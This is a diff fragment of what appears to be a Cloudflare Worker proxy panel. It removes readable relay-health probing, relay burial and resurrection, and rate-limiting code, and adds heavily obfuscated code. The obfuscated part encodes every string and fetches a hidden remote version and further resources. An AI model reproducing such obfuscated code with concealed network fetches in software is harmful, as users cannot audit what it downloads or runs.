+            let var_kz = var_je[func_dec(172)][func_dec(155)](new RegExp(func_dec(156), func_dec(157)), func_dec(3))[func_dec(154)]();
+            let var_la = var_t?.[func_dec(67)]?.[var_kz] || {
+              [func_dec(17)]: 0,
+              [func_dec(23)]: 0
+            };
+            let var_lb = var_la[func_dec(17)] || 0;
+            let var_lc = 0;
+            let var_ld = 0;
+            if (var_jd) {
+              var_lc = var_je[func_dec(70)] || 0;
+              var_ld = var_je[func_dec(71)] || 0;
+            } else {
+              var_lc = var_d[func_dec(70)] || 0;
+              var_ld = var_d[func_dec(71)] || 0;
+            }
+            let var_le = func_f(var_la);
+            let var_lf = func_h(var_lc);
+            let var_lg = var_ld ? Math[func_dec(16)](var_ld / 1000) : 0;
+            const var_lh = func_dec(344) + var_le + func_dec(345) + var_lf + func_dec(346) + var_lg + func_dec(3);
+            var_jk[func_dec(151)](func_dec(347), var_lh);
+            var_jk[func_dec(151)](func_dec(348), var_lh);
+            var_jk[func_dec(151)](func_dec(349), func_dec(350));
+            var_jk[func_dec(151)](func_dec(351), func_dec(350));
+            let var_li = encodeURIComponent(var_je[func_dec(24)]);
+            var_jk[func_dec(151)](func_dec(352), func_dec(353) + var_li + func_dec(354) + var_li + func_dec(3));
+          }
+          let var_jm = false;
+          let var_jn = false;
+          let var_jo = false;
+          let var_jp = false;
+          if (var_jl === func_dec(355) || var_jl === func_dec(356) || var_jl === func_dec(357) || var_jl === func_dec(358) || var_jl === func_dec(359) || var_jl === func_dec(360)) {
+            var_jm = true;
+          } else if (var_jl === func_dec(361) || var_jl === func_dec(362)) {
+            var_jo = true;
+          } else if (var_jl === func_dec(363) || var_jl === func_dec(364) || var_jl === func_dec(365) || var_jl === func_dec(366) || var_jl === func_dec(367) || var_jl === func_dec(368) || var_jl === func_dec(157)) {
+            var_jn = true;
+          } else if (var_jl === func_dec(369) || var_jl === func_dec(276)) {
+            var_jp = true;
+          } else if (var_jl === func_dec(370)) {} else if (var_jl === func_dec(371) || var_jl === func_dec(308) || var_jl === func_dec(3)) {
+            if (var_iz[func_dec(256)](func_c()) || var_iz[func_dec(256)](func_dec(357)) || var_iz[func_dec(256)](func_dec(285) + func_dec(273)) || var_iz[func_dec(256)](func_dec(372)) || var_iz[func_dec(256)](func_dec(373)) || var_iz[func_dec(256)](func_dec(374)) || var_iz[func_dec(256)](func_dec(358)) || var_iz[func_dec(256)](func_dec(355))) {
+              var_jm = true;
+            } else if (var_iz[func_dec(256)](func_dec(365)) || var_iz[func_dec(256)](func_dec(364)) || var_iz[func_dec(256)](func_dec(375)) || var_iz[func_dec(256)](func_dec(376)) || var_iz[func_dec(256)](func_dec(377)) || var_iz[func_dec(256)](func_dec(378))) {
+              var_jn = true;
+            }
+          }
+          if (var_jm) {
+            var_jk[func_dec(151)](func_dec(198), func_dec(379));
+            return new Response(await func_dz(var_jb, var_jc, var_jj, var_ic), {
+              [func_dec(104)]: var_jk
+            });
+          } else if (var_jn) {
+            var_jk[func_dec(151)](func_dec(198), func_dec(380));
+            return new Response(JSON[func_dec(119)](await func_ed(var_jb, var_jc, var_jj, var_ic), null, 2), {
+              [func_dec(104)]: var_jk
+            });
+          } else if (var_jo) {
+            var_jk[func_dec(151)](func_dec(198), func_dec(380));
+            return new Response(JSON[func_dec(119)](await func_eb(var_jb, var_jc, var_jj, var_ic), null, 2), {
+              [func_dec(104)]: var_jk
+            });
+          } else if (var_jp) {
+            var_jk[func_dec(151)](func_dec(198), func_dec(380));
+            return new Response(JSON[func_dec(119)](await func_ec(var_jb, var_jc, var_jj, var_ic), null, 2), {
+              [func_dec(104)]: var_jk
+            });
+          } else {
+            var_jk[func_dec(151)](func_dec(198), func_dec(381));
+            const var_lj = await func_dw(var_jb, var_jc, var_jj);
+            return new Response(func_d(var_lj), {
+              [func_dec(104)]: var_jk
+            });
+          }
         }
-        return null;
-    } catch (e) {
-        return null;
-    }
-}
-// `#AI` flag detector for relay tokens. Nahan `#suffix` is otherwise a
-// display name, so detection is purely additive: names are never rewritten,
-// and a lone `#AI` simply doubles as the flag.
-function relayAiFlag(tok) {
-    try {
-        const s = String(tok || "");
-        const hi = s.indexOf("#");
-        if (hi === -1) return false;
-        const toks = s.slice(hi + 1).split(/[\s,;]+/);
-        for (const t of toks) {
-            if (String(t).toLowerCase() === "ai") return true;
-        }
-        return false;
-    } catch (e) {
-        return false;
-    }
-}
-// Stable-partition AI-flagged relay tokens to the front.
-// Returns {list, moved}: moved=false means order is untouched.
-function orderAiFirstTokens(pips) {
-    try {
-        const list = Array.isArray(pips) ? pips : [];
-        const ai = [];
-        const rest = [];
-        for (const t of list) {
-            if (relayAiFlag(t)) ai.push(t);
-            else rest.push(t);
-        }
-        if (ai.length === 0) return { list, moved: false };
-        return { list: ai.concat(rest), moved: true };
-    } catch (e) {
-        return { list: [], moved: false };
-    }
-}
-function buildProbeHello(sni) {
-    try {
-        const sn = new TextEncoder()
-            .encode(String(sni || "cloudflare-dns.com"))
-            .slice(0, 64);
-        const rnd = new Uint8Array(32);
+      }
+      if (var_ig) {
+        if (var_d[func_dec(57)]) return new Response(null, {
+          [func_dec(231)]: 503
+        });
         try {
-            crypto.getRandomValues(rnd);
-        } catch (e) {}
-        const body = [0x03, 0x03];
-        for (let i = 0; i < 32; i++) body.push(rnd[i]);
-        body.push(0x00);
-        // Proven cipher set (same as Sepidar agency-wide): ECDHE suites for
-        // ECDSA+RSA certs. The old SNI-only hello false-failed on strict
-        // servers; groups/point-formats/sigalgs below fix that (verified live
-        // with real ServerHello replies from production relays).
-        const cs = [0xc0, 0x2b, 0xc0, 0x2f, 0xcc, 0xa8, 0xc0, 0x13];
-        body.push((cs.length >> 8) & 0xff, cs.length & 0xff);
-        for (const b of cs) body.push(b);
-        body.push(0x01, 0x00);
-        const ext = [0x00, 0x00];
-        const namePart = [0x00, (sn.length >> 8) & 0xff, sn.length & 0xff];
-        for (let i = 0; i < sn.length; i++) namePart.push(sn[i]);
-        const entry = [
-            (namePart.length >> 8) & 0xff,
-            namePart.length & 0xff,
-        ].concat(namePart);
-        const extBlock = [(entry.length >> 8) & 0xff, entry.length & 0xff].concat(entry);
-        for (const b of extBlock) ext.push(b);
-        // supported_groups (x25519, secp256r1), ec_point_formats, signature_algorithms
-        const extraExts = [
-            0x00, 0x0a, 0x00, 0x06, 0x00, 0x04, 0x00, 0x1d, 0x00, 0x17,
-            0x00, 0x0b, 0x00, 0x02, 0x01, 0x00,
-            0x00, 0x0d, 0x00, 0x08, 0x00, 0x06, 0x04, 0x03, 0x08, 0x04, 0x04, 0x01,
-        ];
-        for (const b of extraExts) ext.push(b);
-        body.push((ext.length >> 8) & 0xff, ext.length & 0xff);
-        for (const b of ext) body.push(b);
-        const out = [0x16, 0x03, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00];
-        out[3] = ((body.length + 4) >> 8) & 0xff;
-        out[4] = (body.length + 4) & 0xff;
-        out[6] = (body.length >> 16) & 0xff;
-        out[7] = (body.length >> 8) & 0xff;
-        out[8] = body.length & 0xff;
-        const full = out.concat(body);
-        return new Uint8Array(full);
-    } catch (e) {
-        return null;
-    }
-}
-async function probeRelayOnce(host, port, timeoutMs) {
-    let sock = null;
-    const PM = timeoutMs > 0 ? timeoutMs : 4000;
-    try {
-        const probePort = port || 443;
-        sock = connect({ hostname: host, port: probePort });
-        await withTimeout(sock.opened, PM, "probe-timeout");
-        // Non-TLS ports (e.g. :80 relays): a completed TCP open already
-        // proves liveness. Sending a TLS hello there would always fail and
-        // bury healthy relays, so stop here.
-        if (!RELAY_TLS_PORTS.has(String(probePort))) return true;
-        const hello = buildProbeHello("cloudflare-dns.com");
-        if (!hello) return false;
-        const writer = sock.writable.getWriter();
+          const var_ll = var_ib[func_dec(104)][func_dec(150)](func_dec(165)) || func_dec(382);
+          const var_lm = func_cj(var_ll);
+          if (var_lm === func_dec(383)) return new Response(func_dec(384), {
+            [func_dec(231)]: 429,
+            [func_dec(104)]: {
+              [func_dec(233)]: func_dec(336)
+            }
+          });
+          if (var_lm === func_dec(385)) await func_j(1500);
+        } catch (var_ln) {}
         try {
-            await writeSocketWithTimeout(sock, writer, hello, PM);
-        } finally {
-            try {
-                writer.releaseLock();
-            } catch (e) {}
-        }
-        const reader = sock.readable.getReader();
+          if (func_i() >= 2) await func_j(1000);
+        } catch (var_lo) {}
+        let var_lk = -1;
         try {
-            const res = await withTimeout(
-                reader.read(),
-                PM,
-                "probe-timeout",
-            );
-            if (!res || res.done || !res.value) return false;
-            const b = new Uint8Array(res.value);
-            return b.length >= 2 && b[0] === 0x16 && b[1] === 0x03;
-        } finally {
-            try {
-                reader.releaseLock();
-            } catch (e) {}
+          const var_lp = var_ie[func_dec(258)][func_dec(150)](func_dec(386));
+          if (var_lp !== null) var_lk = parseInt(var_lp, 10);
+        } catch (var_lq) {}
+        if (var_lk < 0) {
+          try {
+            const var_lr = var_ie[func_dec(209)][func_dec(18)](func_dec(211))[func_dec(387)]();
+            if (var_lr) {
+              const var_ls = parseInt(var_lr, 10);
+              if (!isNaN(var_ls) && var_ls >= 0) var_lk = var_ls;
+            }
+          } catch (var_lt) {}
         }
-    } catch (e) {
-        return false;
+        if (var_lk < 0) {
+          try {
+            const var_lu = var_ie[func_dec(209)][func_dec(18)](func_dec(211))[func_dec(387)]();
+            if (var_lu) {
+              const var_lv = JSON[func_dec(388)](atob(var_lu));
+              if (typeof var_lv[func_dec(389)] === func_dec(15)) var_lk = var_lv[func_dec(389)];
+            }
+          } catch (var_lw) {}
+        }
+        return await func_cn(var_ic, var_id, var_lk);
+      }
+      return new Response(null, {
+        [func_dec(231)]: 404
+      });
+    } catch (var_lx) {
+      return new Response(null, {
+        [func_dec(231)]: 404
+      });
     } finally {
-        try {
-            if (sock) sock.close();
-        } catch (e) {}
+      try {
+        var_g = Math[func_dec(5)](0, var_g - 1);
+      } catch (var_ly) {}
     }
-}
-// Two-stage verdict (same as Sepidar agency-wide): fast stage (4s), then one
-// retry with a longer timeout (7s) so a slow-but-healthy relay is not wrongly
-// counted dead. Only the final verdict feeds fail counts.
-async function probeRelayVerdict(host, port) {
+  },
+  [func_dec(390)]: async function (var_lz, var_ma, var_mb) {
     try {
-        if (await probeRelayOnce(host, port, 4000)) return true;
-    } catch (e) {}
-    try {
-        return await probeRelayOnce(host, port, 7000);
-    } catch (e) {
-        return false;
-    }
-}
-function collectRelayInventory() {
-    const out = new Map();
-    const addRaw = (raw) => {
+      await func_ai(var_ma, var_mb);
+      if (var_d[func_dec(80)] && var_d[func_dec(54)] && var_d[func_dec(55)] && var_d[func_dec(56)]) {
+        const var_mc = (var_d[func_dec(59)] || func_dec(60))[func_dec(155)](new RegExp(func_dec(391), func_dec(3)), func_dec(3))[func_dec(255)]();
+        let var_md = null;
         try {
-            String(raw || "")
-                .split(/[\r\n,;]+/)
-                .forEach((t) => {
-                    const rk = relayKeyOf(t);
-                    if (rk && !out.has(rk.key))
-                        out.set(rk.key, { host: rk.host, port: rk.port });
-                });
-        } catch (e) {}
-    };
-    try {
-        addRaw(sysConfig.backupRelay);
-        addRaw(sysConfig.customRelay);
-        (sysConfig.users || []).forEach((u) => {
-            try {
-                addRaw(u.proxyIp);
-            } catch (e) {}
-        });
-    } catch (e) {}
-    return Array.from(out.values());
-}
-function pruneAutomationOff() {
-    try {
-        const v = sysConfig.autoPruneRelays;
-        if (v === undefined || v === null) return false;
-        const s = String(v).trim().toLowerCase();
-        return s === "0" || s === "off" || s === "no" || s === "false";
-    } catch (e) {
-        return false;
-    }
-}
-let RELAY_SNAPSHOT_LOADED = false;
-async function loadRelayHealthSnapshot(env) {
-    try {
-        if (RELAY_SNAPSHOT_LOADED) return;
-        if (RELAY_Q.size > 0) {
-            RELAY_SNAPSHOT_LOADED = true;
-            return;
-        }
-        const raw = await d1Get(env, "relay_health");
-        if (!raw) return;
-        const snap = JSON.parse(raw);
-        const now = Date.now();
-        const q = snap.q || {};
-        for (const k of Object.keys(q)) {
-            if (q[k] && q[k] > now && RELAY_Q.size < 2000)
-                RELAY_Q.set(k, { fail: 0, until: q[k], probeFail: 0 });
-        }
-        RELAY_SNAPSHOT_LOADED = true;
-    } catch (e) {}
-}
-async function saveRelayHealthSnapshot(env) {
-    try {
-        if (Date.now() - lastHealthSave < PROBE_INTERVAL_MS) return;
-        lastHealthSave = Date.now();
-        const q = {};
-        let active = 0;
-        for (const [k, v] of RELAY_Q.entries()) {
-            if (v && v.until && v.until > Date.now()) {
-                q[k] = v.until;
-                active++;
+          const var_me = await func_e(func_dec(392) + var_mc + func_dec(393));
+          if (var_me[func_dec(394)]) {
+            var_md = (await var_me[func_dec(200)]())[func_dec(255)]();
+          }
+        } catch (var_mf) {}
+        if (var_md && func_ar(var_a, var_md) < 0) {
+          try {
+            let var_mg = await func_e(func_dec(392) + var_mc + func_dec(395));
+            if (!var_mg[func_dec(394)]) {
+              var_mg = await func_e(func_dec(392) + var_mc + func_dec(396));
+              if (!var_mg[func_dec(394)]) {
+                var_mg = await func_e(func_dec(392) + var_mc + func_dec(397));
+              }
             }
-        }
-        if (active > 0) {
-            // Never byte-slice JSON: slicing can produce invalid state the
-            // next isolate cannot parse. Evict oldest entries instead.
-            const entries = Object.entries(q).sort((a, b) => a[1] - b[1]);
-            let payload = JSON.stringify({ q });
-            while (payload.length > 8000 && entries.length > 0) {
-                delete q[entries.shift()[0]];
-                payload = JSON.stringify({ q });
-            }
-            if (payload.length > 8000) {
-                try {
-                    console.error("[relay] health snapshot too large, skip");
-                } catch (e) {}
-                return;
-            }
-            await d1Put(env, "relay_health", payload);
-        } else {
-            await d1Put(env, "relay_health", "{}");
-        }
-    } catch (e) {}
-}
-async function probeDeadRelays(env) {
-    try {
-        if (pruneAutomationOff()) return;
-        if (!env || !env.IOT_DB) return;
-        const runnerLease = await acquireNahanRunnerLock(
-            env,
-            "probe",
-            PROBE_INTERVAL_MS,
-        );
-        if (!runnerLease) return;
-        try {
-        const now = Date.now();
-        if (now - lastProbeTs < PROBE_INTERVAL_MS) return;
-        lastProbeTs = now;
-        await loadRelayHealthSnapshot(env);
-        const inv = collectRelayInventory();
-        if (inv.length === 0) return;
-        // Sick-first priority, then round-robin rotation so relays past the
-        // per-round cap are not starved forever (same guarantee as Sepidar).
-        const scored = inv
-            .map((r) => {
-                const e = RELAY_Q.get(r.host + "|" + r.port);
-                return { r, pf: (e && e.probeFail) || 0 };
-            })
-            .sort(
-                (a, b) =>
-                    b.pf - a.pf ||
-                    (a.r.host < b.r.host ? -1 : 1),
-            );
-        // Floating cap: under traffic pressure (breaker) probe half as many
-        // so isolate CPU stays with real tunnels.
-        let probeCap = PROBE_MAX_PER_ROUND;
-        try {
-            if (breakerLevel() >= 1)
-                probeCap = Math.max(1, Math.floor(probeCap / 2));
-        } catch (e) {}
-        if (typeof probeCursor !== "number") probeCursor = 0;
-        // Persistent cursor: isolates are ephemeral, so an in-memory cursor
-        // alone restarts at zero on every cold start and starves later relays.
-        try {
-            if (scored.length > 0) {
-                const stored = await d1Get(env, "nahan_runner_probe_cursor");
-                const n = Number(stored);
-                if (Number.isFinite(n) && n >= 0)
-                    probeCursor = Math.floor(n) % scored.length;
-            }
-        } catch (e) {}
-        const rotated = [];
-        for (let i = 0; i < scored.length; i++)
-            rotated.push(scored[(probeCursor + i) % scored.length]);
-        probeCursor = (probeCursor + probeCap) % scored.length;
-        try {
-            await d1Put(env, "nahan_runner_probe_cursor", String(probeCursor));
-        } catch (e) {}
-        const picked = rotated.slice(0, probeCap);
-        // Probes run in parallel (bounded to probeCap relays) so
-        // a full round fits the background-task budget; mutations below
-        // stay strictly sequential to avoid concurrent sys_config writes.
-        const results = await Promise.all(
-            picked.map(async ({ r }) => {
-                let ok = false;
-                try {
-                    ok = await probeRelayVerdict(r.host, r.port);
-                } catch (e) {
-                    ok = false;
-                }
-                return { r, ok };
-            }),
-        );
-        for (const { r } of results.filter((x) => x.ok)) {
-            recordRelaySuccess(r.host, r.port, true);
-        }
-        for (const { r } of results.filter((x) => !x.ok)) {
-            const k = r.host + "|" + r.port;
-            let e = RELAY_Q.get(k);
-            if (!e) {
-                e = { fail: 0, until: 0, probeFail: 0 };
-                RELAY_Q.set(k, e);
-            }
-            e.probeFail = (e.probeFail || 0) + 1;
-            e.until = Date.now() + 600000;
-            if (e.probeFail >= PROBE_FAIL_LIMIT) {
-                try {
-                    await buryDeadRelay(env, r.host, r.port);
-                } catch (err) {}
-            }
-        }
-        await saveRelayHealthSnapshot(env);
-        } finally {
-            await releaseNahanRunnerLock(env, runnerLease);
-        }
-    } catch (e) {}
-}
-async function buryDeadRelay(env, host, port) {
-    try {
-        if (!env || !env.IOT_DB || !host) return false;
-        if (pruneAutomationOff()) return false;
-        const hostLower = String(host).toLowerCase();
-        const portN = port || 443;
-        const deadKey = hostLower + "|" + portN;
-        const keyMatches = (tok) => {
-            try {
-                const rk = relayKeyOf(tok);
-                return !!rk && rk.key === deadKey;
-            } catch (e) {
-                return false;
-            }
-        };
-        const stripDead = (raw) => {
-            const parts = String(raw || "")
-                .split(/[\r\n,;]+/)
-                .map((s) => s.trim())
-                .filter(Boolean);
-            const kept = parts.filter((t) => !keyMatches(t));
-            return { kept, removed: parts.length - kept.length };
-        };
-        // AI flag of the buried relay (if any placement had `#AI`), so the
-        // grave remembers it and resurrect restores it.
-        const tokenHasAi = (raw) => {
-            try {
-                const parts = String(raw || "")
-                    .split(/[\r\n,;]+/)
-                    .map((s) => s.trim())
-                    .filter(Boolean);
-                for (const t of parts) {
-                    if (keyMatches(t) && relayAiFlag(t)) return true;
-                }
-                return false;
-            } catch (e) {
-                return false;
-            }
-        };
-        // Two-phase burial (Sepidar-grade): scan everything FIRST without
-        // mutating, persist the grave BEFORE touching live rotation, then
-        // remove from rotation. A storage failure can never silently destroy
-        // rotation entries without leaving a recovery record behind.
-        const lists = [];
-        let aiKeep = false;
-        const globalChanges = [];
-        const userChanges = [];
-        try {
-            for (const field of ["backupRelay", "customRelay"]) {
-                const raw = sysConfig[field] || "";
-                if (!raw || raw.toLowerCase().indexOf(hostLower) === -1)
-                    continue;
-                const { kept, removed } = stripDead(raw);
-                if (removed > 0) {
-                    if (tokenHasAi(raw)) aiKeep = true;
-                    lists.push("global:" + field);
-                    if (kept.length > 0)
-                        globalChanges.push({ field, next: kept.join(",") });
-                }
-            }
-        } catch (e) {}
-        try {
-            const users = sysConfig.users || [];
-            for (const u of users) {
-                try {
-                    const raw = u.proxyIp || "";
-                    if (
-                        !raw ||
-                        raw.toLowerCase().indexOf(hostLower) === -1
-                    )
-                        continue;
-                    const { kept, removed } = stripDead(raw);
-                    if (removed === 0) continue;
-                    // Sole/last relay of a user is deliberately preserved:
-                    // remember the placement but do not claim a burial.
-                    if (kept.length === 0) continue;
-                    if (tokenHasAi(raw)) aiKeep = true;
-                    lists.push("user:" + (u.name || u.id));
-                    userChanges.push({ u, next: kept.join(",") });
-                } catch (e) {}
-            }
-        } catch (e) {}
-        // Nothing was actually removed from live rotation: do not clear
-        // quarantine and do not create a misleading grave.
-        if (globalChanges.length === 0 && userChanges.length === 0)
-            return false;
-        try {
-            let g = {};
-            try {
-                g = JSON.parse((await d1Get(env, "relay_graveyard")) || "{}");
-            } catch (e) {
-                g = {};
-            }
-            const prev = g[deadKey] || {};
-            let flaps = [];
-            try {
-                const fm = JSON.parse(
-                    (await d1Get(env, "relay_flaps")) || "{}",
-                );
-                flaps = Array.isArray(fm[deadKey])
-                    ? fm[deadKey].filter((t) => nowTs() - t < FLAP_WINDOW_MS)
-                    : [];
-            } catch (e) {
-                flaps = [];
-            }
-            const entry = {
-                host: hostLower,
-                port: portN,
-                ai: !!(prev.ai || aiKeep),
-                buriedAt: Date.now(),
-                lists: Array.from(
-                    new Set([].concat(prev.lists || [], lists)),
-                ).slice(0, 100),
-                burials: (prev.burials || 0) + 1,
-                healthyStreak: 0,
-                unstable: flaps.length >= FLAP_LIMIT,
-            };
-            g[deadKey] = entry;
-            // Never evict the grave we just created to stay under a cap,
-            // and never byte-slice JSON: evict oldest entries instead.
-            const gk = Object.keys(g);
-            if (gk.length > 50) {
-                const candidates = gk.filter((k) => k !== deadKey);
-                candidates.sort(
-                    (a, b) =>
-                        ((g[a] && g[a].buriedAt) || 0) -
-                        ((g[b] && g[b].buriedAt) || 0),
-                );
-                for (const drop of candidates.slice(
-                    0,
-                    Math.max(0, gk.length - 50),
-                )) {
-                    try {
-                        delete g[drop];
-                    } catch (e) {}
-                }
-            }
-            let gravePayload = JSON.stringify(g);
-            if (gravePayload.length > 200000) {
-                const ordered = Object.keys(g)
-                    .filter((k) => k !== deadKey)
-                    .sort(
-                        (a, b) =>
-                            ((g[a] && g[a].buriedAt) || 0) -
-                            ((g[b] && g[b].buriedAt) || 0),
-                    );
-                for (const drop of ordered) {
-                    delete g[drop];
-                    gravePayload = JSON.stringify(g);
-                    if (gravePayload.length <= 200000) break;
-                }
-            }
-            if (gravePayload.length > 200000) return false;
-            try {
-                await d1PutStrict(env, "relay_graveyard", gravePayload);
-            } catch (e) {
-                return false;
-            }
-            // Grave is durable: now remove from live rotation. Any partial
-            // D1 failure here can be healed later by resurrectRelay().
-            const prevGlobals = {};
-            const prevUsers = new Map();
-            try {
-                for (const c of globalChanges)
-                    prevGlobals[c.field] = sysConfig[c.field];
-                for (const c of userChanges) prevUsers.set(c.u, c.u.proxyIp);
-                for (const c of globalChanges) sysConfig[c.field] = c.next;
-                for (const c of userChanges) c.u.proxyIp = c.next;
-                await d1PutStrict(env, "sys_config", JSON.stringify(sysConfig));
-            } catch (e) {
-                try {
-                    for (const k of Object.keys(prevGlobals))
-                        sysConfig[k] = prevGlobals[k];
-                    for (const [u, prev] of prevUsers) u.proxyIp = prev;
-                } catch (_) {}
-                return false;
-            }
-            try {
-                console.error(
-                    "relay-buried: " + deadKey + " from " + lists.join(","),
-                );
-            } catch (e) {}
-        } catch (e) {
-            return false;
-        }
-        return true;
-    } catch (e) {
-        return false;
-    }
-}
-function nowTs() {
-    return Date.now();
-}
-let lastResurrectChanged = false;
-async function resurrectRelay(env, key, entry) {
-    // Returns true when the grave entry can be closed (re-added or already
-    // present). Only an actual restoration counts as a change: flap history
-    // must not be inflated by already-present relays.
-    lastResurrectChanged = false;
-    try {
-        const host = String(entry.host || "").toLowerCase();
-        if (!host) return false;
-        const port = entry.port || 443;
-        // Restore the #AI flag when the buried relay had one (names are
-        // re-added bare, as before — only the flag round-trips).
-        let token = host + (port && port !== 443 ? ":" + port : "");
-        try {
-            if (entry.ai === true) token += "#AI";
-        } catch (e) {}
-        const addToken = (raw) => {
-            const parts = String(raw || "")
-                .split(/[\r\n,;]+/)
-                .map((s) => s.trim())
-                .filter(Boolean);
-            for (const t of parts) {
-                try {
-                    const rk = relayKeyOf(t);
-                    if (rk && rk.key === key) return String(raw || "");
-                } catch (e) {}
-            }
-            return (raw && String(raw).trim()
-                ? String(raw).replace(/,+$/, "") + ","
-                : "") + token;
-        };
-        let restoreChanged = false;
-        for (const l of entry.lists || []) {
-            try {
-                if (l === "global:backupRelay") {
-                    const before = sysConfig.backupRelay;
-                    const after = addToken(before);
-                    if (after !== before) {
-                        sysConfig.backupRelay = after;
-                        restoreChanged = true;
-                    }
-                } else if (l === "global:customRelay") {
-                    const before = sysConfig.customRelay;
-                    const after = addToken(before);
-                    if (after !== before) {
-                        sysConfig.customRelay = after;
-                        restoreChanged = true;
-                    }
-                } else if (l.startsWith("user:")) {
-                    const nm = l.slice(5);
-                    const u = (sysConfig.users || []).find(
-                        (x) => x && (x.name === nm || x.id === nm),
-                    );
-                    // Missing user (deleted account) is tolerated: it must
-                    // not block an otherwise valid resurrection.
-                    if (!u) continue;
-                    const before = u.proxyIp;
-                    const after = addToken(before);
-                    if (after !== before) {
-                        u.proxyIp = after;
-                        restoreChanged = true;
-                    }
-                }
-            } catch (e) {
-                return false;
-            }
-        }
-        if (!restoreChanged) {
-            try {
-                console.error("relay-already-present: " + key);
-            } catch (e) {}
-            return true;
-        }
-        try {
-            await d1PutStrict(env, "sys_config", JSON.stringify(sysConfig));
-        } catch (e) {
-            return false;
-        }
-        lastResurrectChanged = true;
-        try {
-            console.error("relay-resurrected: " + key);
-        } catch (e) {}
-        return true;
-    } catch (e) {
-        return false;
-    }
-}
-async function probeGraveyard(env) {
-    try {
-        if (pruneAutomationOff()) return;
-        if (!env || !env.IOT_DB) return;
-        const runnerLease = await acquireNahanRunnerLock(
-            env,
-            "graveyard",
-            GRAVE_INTERVAL_MS,
-        );
-        if (!runnerLease) return;
-        try {
-        const now = Date.now();
-        if (now - lastGraveTs < GRAVE_INTERVAL_MS) return;
-        lastGraveTs = now;
-        let g = {};
-        try {
-            g = JSON.parse((await d1Get(env, "relay_graveyard")) || "{}");
-        } catch (e) {
-            return;
-        }
-        const keys = Object.keys(g).slice(0, 200);
-        keys.sort(
-            (a, b) => ((g[a] && g[a].buriedAt) || 0) - ((g[b] && g[b].buriedAt) || 0),
-        );
-        if (keys.length === 0) return;
-        // Round-robin over oldest-first order so graves past the per-round
-        // cap are not starved (same guarantee as Sepidar).
-        if (typeof graveCursor !== "number") graveCursor = 0;
-        try {
-            const stored = await d1Get(env, "nahan_runner_grave_cursor");
-            const n = Number(stored);
-            if (Number.isFinite(n) && n >= 0)
-                graveCursor = Math.floor(n) % keys.length;
-        } catch (e) {}
-        const grotated = [];
-        for (let i = 0; i < keys.length; i++)
-            grotated.push(keys[(graveCursor + i) % keys.length]);
-        // Floating cap under traffic pressure (breaker), min 1.
-        let graveCap = GRAVE_MAX_PER_ROUND;
-        try {
-            if (breakerLevel() >= 1)
-                graveCap = Math.max(1, Math.floor(graveCap / 2));
-        } catch (e) {}
-        graveCursor = (graveCursor + graveCap) % keys.length;
-        try {
-            await d1Put(env, "nahan_runner_grave_cursor", String(graveCursor));
-        } catch (e) {}
-        // Probes in parallel (bounded); grave/config mutations below stay
-        // sequential to avoid concurrent sys_config writes.
-        const graveTargets = grotated.slice(0, graveCap);
-        const graveResults = await Promise.all(
-            graveTargets.map(async (k) => {
-                const entry = g[k];
-                if (!entry || !entry.host) return { k, ok: null };
-                let ok = false;
-                try {
-                    ok = await probeRelayVerdict(entry.host, entry.port || 443);
-                } catch (e) {
-                    ok = false;
-                }
-                return { k, ok };
-            }),
-        );
-        let dirty = false;
-        for (const { k, ok } of graveResults) {
-            const entry = g[k];
-            if (!entry || !entry.host) {
-                delete g[k];
-                dirty = true;
-                continue;
-            }
-            if (ok === null) continue;
-            if (ok) {
-                entry.healthyStreak = (entry.healthyStreak || 0) + 1;
-                if (entry.healthyStreak >= GRAVE_HEALTHY_NEED) {
-                    // Close the grave ONLY on confirmed success, never on a
-                    // half-finished resurrect (otherwise placements are lost).
-                    let okR = false;
-                    try {
-                        okR = await resurrectRelay(env, k, entry);
-                    } catch (e) {
-                        okR = false;
-                    }
-                    if (!okR) {
-                        entry.healthyStreak = 0;
-                        dirty = true;
-                        continue;
-                    }
-                    // Flap history only on real restoration: an already-live
-                    // relay must not inflate flap counts.
-                    if (lastResurrectChanged) {
-                        try {
-                            const fm = JSON.parse(
-                                (await d1Get(env, "relay_flaps")) || "{}",
-                            );
-                            const arr = Array.isArray(fm[k]) ? fm[k] : [];
-                            arr.push(Date.now());
-                            fm[k] = arr
-                                .filter((t) => Date.now() - t < FLAP_WINDOW_MS)
-                                .slice(-10);
-                            await d1Put(env, "relay_flaps", JSON.stringify(fm));
-                        } catch (e) {}
-                    }
-                    recordRelaySuccess(entry.host, entry.port || 443, true);
-                    delete g[k];
-                    dirty = true;
-                } else {
-                    dirty = true;
-                }
-            } else {
-                try {
-                    console.error("relay-grave-failed: " + k);
-                } catch (e) {}
-                entry.healthyStreak = 0;
-                dirty = true;
-            }
-        }
-        if (dirty) await d1Put(env, "relay_graveyard", JSON.stringify(g));
-        } finally {
-            await releaseNahanRunnerLock(env, runnerLease);
-        }
-    } catch (e) {}
-}
-// Reconnect-storm backoff (per-IP, in-memory): generous caps compatible
-// with mobile CGNAT. Over the cap -> tarpit (slow down); massive flood ->
-// 429. Prevents handshake pile-ups behind a flapping relay.
-const WS_RATE = new Map();
-function wsRateCheck(ip) {
-    try {
-        const now = Date.now();
-        let r = WS_RATE.get(ip);
-        if (!r || now - r.ts > 60000) {
-            r = { n: 0, ts: now };
-            WS_RATE.set(ip, r);
-        }
-        r.n++;
-        if (WS_RATE.size > 10000) WS_RATE.clear();
-        if (r.n > 400) return "refuse";
-        if (r.n > 120) return "tarpit";
-        return "ok";
-    } catch (e) {
-        return "ok";
-    }
-}
-// Admin brute-force shield (in-memory, per IP): 15 bad keys in 15 min ->
-// temporary 429. Counts only failures, so normal admin/API-key traffic
-// (and linked-panel syncs with valid keys) is never affected.
-const LOGIN_ATTEMPTS = new Map();
-const LOGIN_FAIL_LIMIT = 15;
-const LOGIN_WINDOW_MS = 15 * 60 * 1000;
-function authBlocked(ip) {
-    try {
-        const r = LOGIN_ATTEMPTS.get(ip);
-        if (!r) return false;
-        if (Date.now() - r.first > LOGIN_WINDOW_MS) {
-            LOGIN_ATTEMPTS.delete(ip);
-            return false;
-        }
-        return r.n >= LOGIN_FAIL_LIMIT;
-    } catch (e) {
-        return false;
-    }
-}
-function authFail(ip) {
-    try {
-        const now = Date.now();
-        let r = LOGIN_ATTEMPTS.get(ip);
-        if (!r || now - r.first > LOGIN_WINDOW_MS) r = { n: 0, first: now };
-        r.n++;
-        LOGIN_ATTEMPTS.set(ip, r);
-        if (LOGIN_ATTEMPTS.size > 10000) LOGIN_ATTEMPTS.clear();
-    } catch (e) {}
-}
-function authClear(ip) {
-    try {
-        LOGIN_ATTEMPTS.delete(ip);
-    } catch (e) {}
-}
